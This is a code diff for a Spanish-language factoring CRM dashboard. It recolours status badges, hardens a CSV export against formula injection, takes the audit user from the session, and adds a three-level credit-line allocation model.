 const nuevasEmpMetaMes = (inis, mi) => (inis || []).reduce((s, ini) => s + ((META_NUEVAS_EMP[ini] || [])[mi] || 0), 0);
 const nuevasEmpAgg = (inis) => { let metaYTD = 0, realYTD = 0; (inis || []).forEach((ini) => { for (let mi = 0; mi < MES_ACT; mi++) { metaYTD += (META_NUEVAS_EMP[ini] || [])[mi] || 0; realYTD += nuevasEmpRealMes(ini, mi); } }); return { metaYTD, realYTD, cumpl: metaYTD ? Math.round((realYTD / metaYTD) * 100) : 0 }; };
-const ptmTipo = (c) => c.tag === "FUGA" ? { l: "Recuperar (fuga)", bg: "#FEF2F2", fg: "#DC2626" } : c.tag === "CAÍDA" ? { l: "Retener (caída)", bg: "#FFF7ED", fg: "#C2410C" } : c.estado === "Competencia" ? { l: "Aumentar SOW", bg: "#EFF6FF", fg: "#2563EB" } : c.estado === "Inactivo" ? { l: "Reactivar", bg: "#F1ECFF", fg: "#7c3aed" } : { l: "Crecer", bg: "#F0FDF4", fg: "#16A34A" };
+const ptmTipo = (c) => c.tag === "FUGA" ? { l: "Recuperar (fuga)", bg: "#FEF2F2", fg: "#EF4444" } : c.tag === "CAÍDA" ? { l: "Retener (caída)", bg: "#FFF7ED", fg: "#C2410C" } : c.estado === "Competencia" ? { l: "Aumentar SOW", bg: "#EFF6FF", fg: "#2563EB" } : c.estado === "Inactivo" ? { l: "Reactivar", bg: "#F1ECFF", fg: "#7c3aed" } : { l: "Crecer", bg: "#F0FDF4", fg: "#16A34A" };
 function ptmMetrics(c, meta, sig) {
   const r = pcRng(hashStr("ptm" + c.id));
   const metaSow = +meta.metaSow || 0, metaColoc = +meta.metaColoc || 0;
@@ -13182,7 +15392,7 @@ function ptmMetrics(c, meta, sig) {
   const perdido = serieLost[serieLost.length - 1] || 0;
   return { metaSow, metaColoc, colocReal, sowReal, rentReal, rentMeta, pctColoc, serie, serieLost, perdido, emitio, bloqueado, sowActual: c.sow };
 }
-const ptmStatus = (pct) => pct >= 100 ? { l: "Meta cumplida", c: "#16A34A", bg: "#F0FDF4" } : pct >= 70 ? { l: "En buen ritmo", c: "#2563EB", bg: "#eff6ff" } : pct >= 40 ? { l: "En curso", c: "#C2410C", bg: "#FFF7ED" } : { l: "Rezagado", c: "#dc2626", bg: "#fef2f2" };
+const ptmStatus = (pct) => pct >= 100 ? { l: "Meta cumplida", c: "#16A34A", bg: "#F0FDF4" } : pct >= 70 ? { l: "En buen ritmo", c: "#2563EB", bg: "#eff6ff" } : pct >= 40 ? { l: "En curso", c: "#C2410C", bg: "#FFF7ED" } : { l: "Rezagado", c: "#EF4444", bg: "#fef2f2" };
 // ── PLAN POR EJECUTIVO (tabla) ───────────────────────────────────────────────────────────────────────
 // Resultado del mes por cliente contra su plan (metas). Meses ya cerrados: siembra determinística que se
 // PERSISTE en CIERRE_MES (para recuperar cómo fue, comparar la evolución de los últimos meses y exportar).
@@ -13219,7 +15429,7 @@ function planFilaMes(c, meta, mi) {
 }
 const PPE_TEND = {
   Subiendo: { l: "Subiendo", c: "#16A34A", bg: "#F0FDF4", Icon: ArrowUpRight },
-  Bajando: { l: "Bajando", c: "#dc2626", bg: "#fef2f2", Icon: ArrowDownRight },
+  Bajando: { l: "Bajando", c: "#EF4444", bg: "#fef2f2", Icon: ArrowDownRight },
   Estable: { l: "Estable", c: "#C2410C", bg: "#FFF7ED", Icon: ArrowRight },
   Nuevo: { l: "Nuevo", c: "#7c3aed", bg: "#F1ECFF", Icon: Sparkles },
 };
@@ -13229,7 +15439,7 @@ function sowTendMes(c, meta, mi) {
   return d > 2 ? PPE_TEND.Subiendo : d < -2 ? PPE_TEND.Bajando : PPE_TEND.Estable;
 }
 function planScoreSerie(c, meta, mi, back = 6) { const out = []; for (let m = Math.max(0, mi - back + 1); m <= mi; m++) out.push(planFilaMes(c, meta, m).score); return out; }
-const metaScoreColor = (s) => s >= 80 ? "#16A34A" : s >= 55 ? "#2563EB" : s >= 35 ? "#C2410C" : "#dc2626";
+const metaScoreColor = (s) => s >= 80 ? "#16A34A" : s >= 55 ? "#2563EB" : s >= 35 ? "#C2410C" : "#EF4444";
 function GaugeMeta({ score, size = 50 }) {
   const col = metaScoreColor(score), r = size / 2 - 5, cx = size / 2, cy = size / 2, circ = 2 * Math.PI * r, frac = Math.max(0, Math.min(1, score / 100));
   return (
@@ -13279,7 +15489,7 @@ function ptmSignals(c) {
   const lineaDisp = Math.max(0, lineaAprob - lineaUso);
   const lineaPct = lineaAprob ? Math.round(lineaDisp / lineaAprob * 100) : 0;
   const moraDias = r() < 0.22 ? 5 + Math.floor(r() * 60) : 0;
-  const riesgo = moraDias >= 30 ? { l: `Moroso ${moraDias}d`, c: "#dc2626", bg: "#fef2f2" }
+  const riesgo = moraDias >= 30 ? { l: `Moroso ${moraDias}d`, c: "#EF4444", bg: "#fef2f2" }
     : moraDias > 0 ? { l: `Atención ${moraDias}d`, c: "#C2410C", bg: "#FFF7ED" }
     : r() < 0.15 ? { l: "En observación", c: "#C2410C", bg: "#FFF7ED" }
     : { l: "Buen comportamiento", c: "#16A34A", bg: "#F0FDF4" };
@@ -13422,7 +15632,10 @@ function PlanPorEjecutivo({ ejec, soloExec, esJefe, usuarioNombre, plan, setPlan
     const sep = ";", BOM = String.fromCharCode(0xFEFF);
     const head = ["Ejecutivo", "Cliente", "RUT", "Estado", "Busqueda", "Meta facturas (MM)", "Facturas compradas (MM)", "Meta colocacion (MM)", "Colocacion (MM)", "Linea aprobada (MM)", "Linea usada (MM)", "Uso linea (%)", "Meta tasa (%)", "Tasa mes (%)", "Meta SOW (%)", "SOW real (%)", "Tendencia SOW", "Status metas"];
     const rows = filas.map(({ c, f, tend, busq, sig }) => [c.ej, c.nombre, c.rut, c.estado !== "Inactivo" ? "Activa" : "Inactiva", busq.estado === "activa" ? "Activa" : "Pausada", f.metaFact, f.realFact, f.metaColoc, f.realColoc, sig.lineaAprob, sig.lineaUso, 100 - sig.lineaPct, f.metaTasa, f.realTasa, f.metaSow, f.sowReal, tend.l, f.score]);
-    const csv = BOM + [head, ...rows].map((r) => r.join(sep)).join("\n");
+    // Mismo tratamiento que el resto de los exportes: neutralizar fórmulas y entrecomillar. Sin esto,
+    // una razón social con un ; parte la fila y una que empiece con = se ejecuta al abrir la planilla.
+    const esc = (v) => `"${String(celdaSegura(v)).replace(/"/g, '""')}"`;
+    const csv = BOM + [head, ...rows].map((r) => r.map(esc).join(sep)).join("\n");
     const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" }); const url = URL.createObjectURL(blob); const a = document.createElement("a"); a.href = url; a.download = `plan_por_ejecutivo_${MES_NOM[mesSel]}.csv`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
     registrarAuditoria({ usuario: usuarioNombre, modulo: "Plan por ejecutivo", accion: "Exportar CSV", glosa: `Exportó el plan por ejecutivo (${MES_NOM[mesSel]})`, exito: true });
   };
@@ -13459,7 +15672,7 @@ function PlanPorEjecutivo({ ejec, soloExec, esJefe, usuarioNombre, plan, setPlan
           <thead><tr style={{ borderBottom: `1px solid ${C.line}` }}>{cols.map((c, i) => <th key={i} className="px-3 py-2 text-left t9 font-bold uppercase tracking-wide" style={{ color: C.faint }}>{c}</th>)}</tr></thead>
           <tbody>
             {filas.map(({ c, f, tend, serie, busq, sig }) => {
-              const grp = ejec === "todos" && c.ej !== lastEj; if (grp) lastEj = c.ej; const act = estadoCli(c); const bAct = busq.estado === "activa"; const Tend = tend.Icon; const uso = 100 - sig.lineaPct; const usoCol = uso >= 90 ? "#dc2626" : uso >= 70 ? "#C2410C" : "#2563EB";
+              const grp = ejec === "todos" && c.ej !== lastEj; if (grp) lastEj = c.ej; const act = estadoCli(c); const bAct = busq.estado === "activa"; const Tend = tend.Icon; const uso = 100 - sig.lineaPct; const usoCol = uso >= 90 ? "#EF4444" : uso >= 70 ? "#C2410C" : "#2563EB";
               return (
                 <Fragment key={c.id}>
                   {grp && <tr style={{ backgroundColor: "#FAF9FB" }}><td colSpan={cols.length} className="px-3 py-1.5 t10 font-bold" style={{ color: C.indigo }}>{c.ej}</td></tr>}
@@ -13489,14 +15702,14 @@ function PlanPorEjecutivo({ ejec, soloExec, esJefe, usuarioNombre, plan, setPlan
           <div className="w-full max-w-2xl rounded-2xl p-6" style={{ backgroundColor: "#fff", maxHeight: "92vh", overflowY: "auto" }} onClick={(e) => e.stopPropagation()}>
             <div className="flex items-start justify-between" style={{ borderBottom: `1px solid ${C.line}`, paddingBottom: 12 }}><div><h3 className="text-lg font-bold" style={{ color: C.ink }}>Definir plan · {editMeta.nombre}</h3><p className="t11" style={{ color: C.faint }}>{editMeta.ej} · {editMeta.zona} · SoW {editMeta.sow}%/{editMeta.target}% · {PTM_MES}</p></div><button onClick={() => setEditMeta(null)} style={{ color: C.faint }}><X size={18} /></button></div>
             {!esJefe && <div className="mt-3 flex items-center gap-2 rounded-xl p-2.5 t11" style={{ backgroundColor: "#FFF7ED", border: "1px solid #FED7AA", color: "#C2410C" }}><AlertTriangle size={14} /> Solo la jefatura puede editar las metas.</div>}
-            <div className="mt-3"><div className="mb-1 flex flex-wrap items-center justify-between gap-2"><span className="t9 font-bold uppercase tracking-wide" style={{ color: C.faint }}>Evolución de la cartera · colocación del mes</span><span className="t9" style={{ color: C.faint }}>Hoy <b style={{ color: "#2563EB" }}>{fmtMMc(cmEdit.colocHoy)}</b> · al cierre entre <b style={{ color: "#DC2626" }}>{fmtMMc(cmEdit.minEnd)}</b> y <b style={{ color: "#16A34A" }}>{fmtMMc(cmEdit.maxEnd)}</b></span></div><ColocacionChart model={cmEdit} h={150} /></div>
+            <div className="mt-3"><div className="mb-1 flex flex-wrap items-center justify-between gap-2"><span className="t9 font-bold uppercase tracking-wide" style={{ color: C.faint }}>Evolución de la cartera · colocación del mes</span><span className="t9" style={{ color: C.faint }}>Hoy <b style={{ color: "#2563EB" }}>{fmtMMc(cmEdit.colocHoy)}</b> · al cierre entre <b style={{ color: "#EF4444" }}>{fmtMMc(cmEdit.minEnd)}</b> y <b style={{ color: "#16A34A" }}>{fmtMMc(cmEdit.maxEnd)}</b></span></div><ColocacionChart model={cmEdit} h={150} /></div>
             <div className="mt-3 grid grid-cols-2 gap-2">
               <div className="rounded-xl p-3" style={{ backgroundColor: "#EFF6FF", border: "1px solid #BFDBFE" }}><div className="t8 font-bold uppercase tracking-wide" style={{ color: "#2563EB" }}>Línea de crédito disponible</div><div className="t14 font-bold" style={{ color: "#2563EB" }}>{fmtMMc(sig.lineaDisp)}</div><div className="t9" style={{ color: C.faint }}>{sig.lineaPct}% de {fmtMMc(sig.lineaAprob)} aprobada</div></div>
               <div className="rounded-xl p-3" style={{ backgroundColor: sig.riesgo.bg, border: `1px solid ${sig.riesgo.c}33` }}><div className="t8 font-bold uppercase tracking-wide" style={{ color: sig.riesgo.c }}>Comportamiento de riesgo</div><div className="t14 font-bold" style={{ color: sig.riesgo.c }}>{sig.riesgo.l}</div><div className="t9" style={{ color: C.faint }}>{sig.moraDias > 0 ? `Morosidad ${sig.moraDias} días` : "Sin morosidad vigente"}</div></div>
             </div>
             <div className="mt-4 flex flex-wrap items-center gap-4"><span className="t12 font-semibold" style={{ color: C.sub }}>Definir la meta por:</span>{[["sow", "SOW (%)"], ["colocacion", "Colocación (MM$)"]].map(([k, l]) => (<label key={k} className="flex cursor-pointer items-center gap-1.5 t12" style={{ color: criterio === k ? C.ink : C.sub }}><input type="radio" name="critMetaPPE" disabled={!esJefe} checked={criterio === k} onChange={() => setCriterio(k)} style={{ accentColor: C.indigo }} /><span className={criterio === k ? "font-semibold" : ""}>{l}</span></label>))}</div>
             <div className="mt-2 grid grid-cols-1 gap-4 sm:grid-cols-2">
-              <div><div className="mb-1.5 t12" style={{ color: C.sub }}>Meta SOW (%){criterio === "colocacion" ? " · calculado" : ""}</div><input type="number" disabled={!esJefe || criterio !== "sow"} value={ef.metaSow} onChange={(e) => { const v = Math.max(0, Math.min(100, parseInt(e.target.value || "0", 10) || 0)); setEf({ metaSow: v, metaColoc: Math.round(v / 100 * flujo) }); }} className="w-full rounded-xl px-3 py-2.5 t13 outline-none" style={{ border: `1px solid ${C.line}`, color: C.ink, backgroundColor: (esJefe && criterio === "sow") ? "#fff" : "#F9FAFB" }} /><div className="mt-1 t9" style={{ color: sowExcede ? "#dc2626" : C.faint }}>{criterio === "sow" ? `Brecha objetivo: +${gap} pp sobre el SoW actual.` : sowExcede ? "La colocación supera el flujo: SOW limitado a 100%." : "Participación sobre el flujo de buenas facturas."}</div></div>
+              <div><div className="mb-1.5 t12" style={{ color: C.sub }}>Meta SOW (%){criterio === "colocacion" ? " · calculado" : ""}</div><input type="number" disabled={!esJefe || criterio !== "sow"} value={ef.metaSow} onChange={(e) => { const v = Math.max(0, Math.min(100, parseInt(e.target.value || "0", 10) || 0)); setEf({ metaSow: v, metaColoc: Math.round(v / 100 * flujo) }); }} className="w-full rounded-xl px-3 py-2.5 t13 outline-none" style={{ border: `1px solid ${C.line}`, color: C.ink, backgroundColor: (esJefe && criterio === "sow") ? "#fff" : "#F9FAFB" }} /><div className="mt-1 t9" style={{ color: sowExcede ? "#EF4444" : C.faint }}>{criterio === "sow" ? `Brecha objetivo: +${gap} pp sobre el SoW actual.` : sowExcede ? "La colocación supera el flujo: SOW limitado a 100%." : "Participación sobre el flujo de buenas facturas."}</div></div>
               <div><div className="mb-1.5 t12" style={{ color: C.sub }}>Meta colocación (MM$){criterio === "sow" ? " · estimado" : ""}</div><input type="number" disabled={!esJefe || criterio !== "colocacion"} value={ef.metaColoc} onChange={(e) => { const v = Math.max(0, parseInt(e.target.value || "0", 10) || 0); setEf({ metaColoc: v, metaSow: Math.min(100, Math.round(v / (flujo || 1) * 100)) }); }} className="w-full rounded-xl px-3 py-2.5 t13 outline-none" style={{ border: `1px solid ${C.line}`, color: C.ink, backgroundColor: (esJefe && criterio === "colocacion") ? "#fff" : "#F9FAFB" }} /><div className="mt-1 t9" style={{ color: C.faint }}>{criterio === "sow" ? `Estimado = SOW × facturas buenas (prom. 3m: ${fmtMMc(flujo)}).` : `Facturas buenas (prom. 3m): ${fmtMMc(flujo)}.`}</div></div>
             </div>
             <div className="mt-3 rounded-xl p-3" style={{ backgroundColor: "#F0FDF4", border: "1px solid #bbf7d0" }}><div className="t8 font-bold uppercase tracking-wide" style={{ color: "#16A34A" }}>Rentabilidad objetivo · spread 33 pbs</div><div className="t14 font-bold" style={{ color: "#16A34A" }}>{fmtMMc(rentObj)}</div><div className="t9" style={{ color: C.faint }}>0,33% sobre la meta de colocación definida. Para sostener la meta al cierre debe colocar {fmtMMc(cmEdit.faltante)} en el mes.</div></div>
@@ -13515,7 +15728,7 @@ function PlanPorEjecutivo({ ejec, soloExec, esJefe, usuarioNombre, plan, setPlan
               <div key={mi} className="flex items-center gap-2 rounded-lg px-2 py-1.5" style={{ backgroundColor: mi === MES_ACT ? "#F1ECFF" : cerr ? "#F9FAFB" : "#fff", border: `1px solid ${mi === MES_ACT ? "#D9CCFF" : C.line}` }}>
                 <span className="w-8 t11 font-semibold" style={{ color: C.ink }}>{mn}</span><span className="t9" style={{ color: C.faint }}>Meta</span>
                 <input type="number" value={(metaEmpDraft[metaEmpExec] || [])[mi] ?? 0} onChange={(e) => setMetaEmpDraft((d) => { const nd = { ...d, [metaEmpExec]: [...(d[metaEmpExec] || Array(12).fill(0))] }; nd[metaEmpExec][mi] = Math.max(0, parseInt(e.target.value || "0", 10) || 0); return nd; })} className="w-16 rounded-md px-2 py-1 t11 outline-none" style={{ border: `1px solid ${C.line}`, color: C.ink }} />
-                {cerr ? <span className="ml-auto t10" style={{ color: C.sub }}>real <b style={{ color: C.ink }}>{real}</b> · cumpl <b style={{ color: cumpl >= 100 ? "#16A34A" : cumpl >= 80 ? "#C2410C" : "#dc2626" }}>{cumpl}%</b></span> : <span className="ml-auto t9" style={{ color: C.faint }}>{mi === MES_ACT ? "en curso" : "pendiente"}</span>}
+                {cerr ? <span className="ml-auto t10" style={{ color: C.sub }}>real <b style={{ color: C.ink }}>{real}</b> · cumpl <b style={{ color: cumpl >= 100 ? "#16A34A" : cumpl >= 80 ? "#C2410C" : "#EF4444" }}>{cumpl}%</b></span> : <span className="ml-auto t9" style={{ color: C.faint }}>{mi === MES_ACT ? "en curso" : "pendiente"}</span>}
               </div>
             ); })}</div>
             <div className="mt-4 flex justify-end gap-2"><button onClick={() => setMetaEmpOpen(false)} className="rounded-full px-4 py-1.5 t11 font-medium" style={{ border: `1px solid ${C.line}`, color: C.sub }}>Cancelar</button><button onClick={() => { META_NUEVAS_EMP = JSON.parse(JSON.stringify(metaEmpDraft)); registrarAuditoria({ usuario: usuarioNombre, modulo: "Plan por ejecutivo", accion: "Editar meta nuevas empresas", glosa: "Actualizó las metas mensuales de nuevas empresas por ejecutivo", exito: true }); setMetaEmpOpen(false); }} className="rounded-full px-4 py-1.5 t11 font-semibold text-white" style={{ backgroundColor: C.indigo }}>Guardar</button></div>
@@ -13771,7 +15984,10 @@ function OperacionesView({ deals, onOpen, soloExec }) {
   // en la URL — no el id de la operación, que sería adivinable (ver `emitirTicketDetalle`).
   const abrirOperacion = (o) => {
     const slim = { id: o.id, neg: o.neg, cliente: o.cliente, deudor: o.deudor, facturas: o.facturas, montoMM: o.montoMM, tasa: o.tasa, giroMM: o.giroMM, fecha: o.fecha, estado: o.estado, sub: o.sub, exec: o.exec, estadoPago: o.estadoPago, pctPagado: o.pctPagado, montoPagado: o.montoPagado, aTiempo: o.aTiempo, diasAtraso: o.diasAtraso, ts: o.ts, rut: (o.deal && o.deal.rutEmisor) || o.rut };
-    const tk = emitirTicketDetalle("op", o.id, usuario, { op: slim, ts: Date.now() });
+    // La identidad la da la SESIÓN, no un prop: OperacionesView nunca recibió `usuario` y esta línea
+    // lanzaba ReferenceError al abrir el detalle de una operación. Además, para un ticket de auditoría
+    // corresponde el usuario autenticado y no lo que traiga la vista.
+    const tk = emitirTicketDetalle("op", o.id, (SESION && SESION.usuario) || "—", { op: slim, ts: Date.now() });
     try { window.open(location.pathname + "?t=" + encodeURIComponent(tk), "_blank"); } catch (e) {}
   };
   const pagoCol = { "Pagada": { bg: "#F0FDF4", fg: "#16A34A" }, "Parcial": { bg: "#FFF7ED", fg: "#C2410C" }, "Pendiente": { bg: "#F3F4F6", fg: "#4B5563" } };
@@ -13837,7 +16053,7 @@ function OperacionesView({ deals, onOpen, soloExec }) {
                     <span className="rounded-full px-2 py-0.5 t10 font-semibold" style={{ backgroundColor: pc.bg, color: pc.fg }}>{o.estadoPago}{o.estadoPago !== "Pendiente" ? ` · ${o.pctPagado}%` : ""}</span>
                     {o.estadoPago !== "Pendiente" && <div className="mt-0.5 t9" style={{ color: C.faint }}>{fmtMM(o.montoPagado)}</div>}
                     {o.aTiempo === true && <div className="t9 font-semibold" style={{ color: "#16A34A" }}>A tiempo ✓</div>}
-                    {o.aTiempo === false && <div className="t9 font-semibold" style={{ color: "#dc2626" }}>Atrasada +{o.diasAtraso}d</div>}
+                    {o.aTiempo === false && <div className="t9 font-semibold" style={{ color: "#EF4444" }}>Atrasada +{o.diasAtraso}d</div>}
                   </div>
                 ); })()}</td>
                 <td className="whitespace-nowrap px-3 py-2.5 t11" style={{ color: C.sub }}>{o.exec}</td>
@@ -13869,7 +16085,7 @@ function OperacionesView({ deals, onOpen, soloExec }) {
                     <span className="rounded-full px-2 py-0.5 t10 font-semibold" style={{ backgroundColor: pc.bg, color: pc.fg }}>{f.estadoPago}{f.estadoPago === "Pagada" ? ` · ${f.pctPagado}%` : ""}</span>
                     {f.estadoPago === "Pagada" && <div className="mt-0.5 t9" style={{ color: C.faint }}>{fmtMM(f.montoPagado)}</div>}
                     {f.aTiempo === true && <div className="t9 font-semibold" style={{ color: "#16A34A" }}>A tiempo ✓</div>}
-                    {f.aTiempo === false && <div className="t9 font-semibold" style={{ color: "#dc2626" }}>Atrasada +{f.diasAtraso}d</div>}
+                    {f.aTiempo === false && <div className="t9 font-semibold" style={{ color: "#EF4444" }}>Atrasada +{f.diasAtraso}d</div>}
                   </div>
                 ); })()}</td>
                 <td className="whitespace-nowrap px-3 py-2.5 t11" style={{ color: C.sub }}>{f.exec}</td>
@@ -13906,9 +16122,563 @@ const LINEAS_DATA = (() => {
   });
   return out;
 })();
+// ============================================================
+// LÍNEAS DE CRÉDITO · LOS TRES NIVELES
+// El modelo del factoring tiene TRES líneas independientes, y una factura sólo se puede cursar si
+// cabe en las tres a la vez:
+//   1) Línea del CLIENTE — campo ASIGNADO al cliente (no un consolidado). Típicamente mayor o igual
+//      que la suma de sus LF1..LF4, así que en la práctica casi nunca es el nivel que bloquea.
+//   2) Línea del PAR cliente-deudor — LF1/LF2/LF3/LF4. Es el objeto atómico.
+//   3) Línea del DEUDOR — línea propia del RUT deudor para evitar sobreconcentración en él. La
+//      consumen TODOS los clientes que le ceden facturas, y por eso su ampliación afecta carteras
+//      que el ejecutivo no ve.
+// La LF1 es EXCLUYENTE: se elimina cuando el comité asigna LF2/LF3/LF4. Un cliente está siempre en
+// uno de dos estados, nunca en ambos:
+//   estado A · enrolado sin comité → sólo LF1 $30M, deudores prime, un solo uso, se consume completa
+//   estado B · con comité         → LF2 + LF3 + LF4, sin LF1
+// ============================================================
+// Montos en MM con UN decimal, como el resto del proyecto. Sin redondear, el ruido de punto flotante
+// rompe los invariantes por 1e-13 y los montos se muestran con 15 decimales.
+const mmRound = (n) => Math.round(n * 10) / 10;
+const LF1_MM = 30; // línea inicial al enrolar un cliente
+
+// Índice (RUTEmisor → [{ rut, nombre, vol }]) de los deudores a los que cada cliente factura,
+// ordenados por volumen facturado. Es el insumo del dimensionamiento: el cupo del par se aprueba
+// proporcional a la cuantía de la actividad comercial entre el cliente y ese deudor (spec §3.9).
+let _dtePares = null;
+function paresPorEmisor() {
+  if (_dtePares) return _dtePares;
+  _dtePares = new Map();
+  const dte = (typeof window !== "undefined" && Array.isArray(window.DTESYNC)) ? window.DTESYNC : [];
+  const m = new Map();
+  for (const r of dte) {
+    if (!r || !r.RUTEmisor || !r.RUTRecep) continue;
+    let g = m.get(r.RUTEmisor); if (!g) { g = new Map(); m.set(r.RUTEmisor, g); }
+    const p = g.get(r.RUTRecep) || { rut: r.RUTRecep, nombre: r.RznSocRecep, vol: 0 };
+    p.vol += r.MntTotal || 0; g.set(r.RUTRecep, p);
+  }
+  for (const [rut, g] of m) _dtePares.set(rut, [...g.values()].sort((a, b) => b.vol - a.vol));
+  return _dtePares;
+}
+
+// LÍNEA DE OTROS DEUDORES del cliente (LF4), POR CATEGORÍA DE DEUDOR. Se DIMENSIONA con la regla del
+// spec —10% de la suma de cupos— y no con el monto de window.LINEA_DISPONIBLE: ese dato trae 15–40MM
+// por fila, que en un cliente de 1.200MM de línea deja a veinte deudores de la cola compitiendo por
+// 15MM y hace que casi toda oferta caiga a comité. De LINEA_DISPONIBLE se conservan las dos cosas
+// que sí aportan y no se pueden derivar: el corte por categoría de deudor (la misma llave que usa
+// `tipoLineaDeDeudor`) y el estado «Suspendida». Una línea suspendida conserva su exposición vigente
+// —la suspensión no libera lo cedido— pero NO admite operaciones nuevas.
+let _lf4Idx = null;
+function lf4MetaPorCliente(rutCli) {
+  if (!_lf4Idx) {
+    _lf4Idx = new Map();
+    const arr = (typeof window !== "undefined" && Array.isArray(window.LINEA_DISPONIBLE)) ? window.LINEA_DISPONIBLE : [];
+    for (const r of arr) {
+      let g = _lf4Idx.get(r.RUTCliente); if (!g) { g = []; _lf4Idx.set(r.RUTCliente, g); }
+      g.push({ categoria: r.TipoLinea, peso: r.MontoAprobadoMM || 0, suspendida: r.Estado === "Suspendida" });
+    }
+  }
+  return _lf4Idx.get(rutCli) || [{ categoria: "Lista Blanca", peso: 1, suspendida: false }, { categoria: "Deudores Autorizados", peso: 1, suspendida: false }];
+}
+
+// Estado de líneas de un cliente, memoizado por RUT. El cálculo es COMPLETO —todas sus líneas, no
+// sólo las de la oferta abierta— porque los invariantes se sostienen sobre el total: si el uso se
+// repartiera sólo entre los pares consultados, la suma dejaría de cuadrar con el menú Líneas.
+const _cacheCli = new Map();
+function lineasDeCliente(rutCli) {
+  if (_cacheCli.has(rutCli)) return _cacheCli.get(rutCli);
+  const idx = lineaIdxPorRut();
+  const fila = idx ? idx.get(rutCli) || null : null;
+  const deudores = paresPorEmisor().get(rutCli) || [];
+  let res;
+
+  if (!fila) {
+    // ESTADO A · enrolado, sin comité. Sólo LF1, excluyente con LF2/LF3/LF4.
+    res = {
+      estado: "A", asignadaCliente: LF1_MM, usoCliente: 0, cola: deudores,
+      lineas: [{ id: "LF1-" + rutCli, tipo: "LF1", granularidad: "comodin", rutDeudor: null, aprobado: LF1_MM, vigente: 0, soloPrime: true, unSoloUso: true }],
+    };
+    _cacheCli.set(rutCli, res); return res;
+  }
+
+  // ESTADO B · con comité.
+  const rnd = pcRng(hashStr("lpar" + rutCli));
+
+  // Presupuesto del cliente: la línea asignada MENOS su holgura (entre 8% y 22%). De ahí, la línea
+  // comodín se lleva el 10% de la suma de cupos y el resto va a las líneas de par.
+  let objetivoTotal = Math.max(Math.round(fila.aprobada * (0.78 + rnd() * 0.14)), Math.ceil(fila.uso / 0.88));
+  objetivoTotal = Math.min(objetivoTotal, fila.aprobada);
+  const apComodin = Math.max(5, Math.round(objetivoTotal * 0.0909)); // 10% de los cupos de par
+  const objetivoPares = Math.max(5, objetivoTotal - apComodin);
+
+  // Heredan del dato el corte por categoría y el estado; el monto sale de la regla.
+  const meta = lf4MetaPorCliente(rutCli);
+  const pesoTot = meta.reduce((s, m) => s + (m.peso || 0), 0) || meta.length;
+  const comodines = meta.map((m, i) => ({
+    id: "LF4-" + rutCli + "-" + (m.categoria === "Lista Blanca" ? "LB" : "DA"),
+    tipo: "LF4", granularidad: "comodin", categoria: m.categoria, rutDeudor: null, suspendida: m.suspendida,
+    aprobado: i === meta.length - 1 ? mmRound(apComodin - meta.slice(0, i).reduce((s, x) => s + Math.round(apComodin * ((x.peso || 1) / pesoTot)), 0)) : Math.round(apComodin * ((m.peso || 1) / pesoTot)),
+    vigente: 0,
+  }));
+  // Uso repartido en la misma proporción que lo aprobado: la utilización se distribuye sobre toda la
+  // capacidad, no sólo sobre los pares.
+  let usComodin = Math.min(apComodin, mmRound(fila.uso * (apComodin / (objetivoTotal || 1))));
+  { let q = usComodin; for (const p of comodines) { const t = Math.min(p.aprobado, mmRound(q)); p.vigente = t; q = mmRound(q - t); } usComodin = mmRound(usComodin - Math.max(0, q)); }
+
+  // La cabeza de la distribución tiene línea propia; la cola la financia la de otros deudores. Se toman los
+  // deudores que concentran el 85% del volumen del cliente: dejar sólo 4–11 con línea mandaba a
+  // veinte deudores a la de otros deudores y convertía casi toda la oferta en solicitud al comité.
+  // deudores que concentran el 85% del volumen, entre 6 y 12. El tope de 12 importa: repartir el
+  // presupuesto entre veinte pares dejaba líneas de 5MM contra facturas de 8MM de mediana, y cada
+  // factura quedaba sobre su propio cupo. Fragmentar la línea la vuelve inútil.
+  const volTotalCli = deudores.reduce((s, d) => s + d.vol, 0) || 1;
+  let acum = 0, nPar85 = 0;
+  for (const d of deudores) { nPar85++; acum += d.vol; if (acum / volTotalCli >= 0.85) break; }
+  // Deudores con línea propia: los que concentran el 85% del volumen, entre 6 y 12. El tope de 12
+  // importa —repartir el presupuesto entre veinte pares dejaba líneas de 5MM contra facturas de 8MM
+  // de mediana— y el piso de 6 también: escalar el número de pares con el tamaño de la línea (~1 por
+  // cada 100MM) se midió PEOR, porque deja a más deudores de la oferta sin línea propia y los manda
+  // sin línea propia. 6–12 dio 84% de ofertas cursables completas contra 80% de la variante escalada.
+  const nPar = Math.max(1, Math.min(deudores.length, Math.max(6, Math.min(12, nPar85))));
+  const cabeza = deudores.slice(0, nPar);
+
+  const necesario = Math.max(0, mmRound(fila.uso - usComodin));
+
+  const volTot = cabeza.reduce((s, d) => s + d.vol, 0) || 1;
+  // Cupo por par: proporcional al volumen, con un PISO proporcional al presupuesto (no 5MM planos —
+  // en un cliente de 1.200MM una línea de 5MM no financia ninguna factura y sólo produce rechazos).
+  // Después se normaliza para que la suma sea exactamente el presupuesto de pares: aplicar el piso
+  // sin normalizar podía pasarse del presupuesto y romper el tope del cliente.
+  const pisoPar = Math.max(5, Math.round(objetivoPares * 0.03 / 5) * 5);
+  const crudos = cabeza.map((d) => Math.max(pisoPar, Math.round(objetivoPares * (d.vol / volTot) / 5) * 5));
+  const sumaCruda = crudos.reduce((s, x) => s + x, 0) || 1;
+  const cupos = crudos.map((c) => Math.max(5, Math.round(c * (objetivoPares / sumaCruda) / 5) * 5));
+  const lineas = []; let repartido = 0;
+  cabeza.forEach((d, i) => {
+    const ultimo = i === cabeza.length - 1;
+    let cupo = ultimo ? Math.max(5, objetivoPares - repartido) : cupos[i];
+    repartido += cupo;
+    // ~18% de los pares con línea llevan además una PUNTUAL (LF3) tallada sobre su cupo. Una LF3
+    // sólo puede estar intacta o consumida COMPLETA (§3.6): nunca a medias.
+    const mLF3 = rnd() < 0.18 ? Math.max(5, Math.round(cupo * (0.2 + rnd() * 0.3) / 5) * 5) : 0;
+    if (mLF3 > 0) lineas.push({ id: "LF3-" + rutCli + "-" + i, tipo: "LF3", granularidad: "par", rutDeudor: d.rut, nombreDeudor: d.nombre, aprobado: mLF3, vigente: 0, unSoloUso: true, quemada: rnd() < 0.34 });
+    lineas.push({ id: "LF2-" + rutCli + "-" + i, tipo: "LF2", granularidad: "par", rutDeudor: d.rut, nombreDeudor: d.nombre, aprobado: Math.max(5, cupo - mLF3), vigente: 0 });
+  });
+
+  // Si la talla de una LF3 deja a las LF2 sin capacidad para sostener el uso vigente, la puntual se
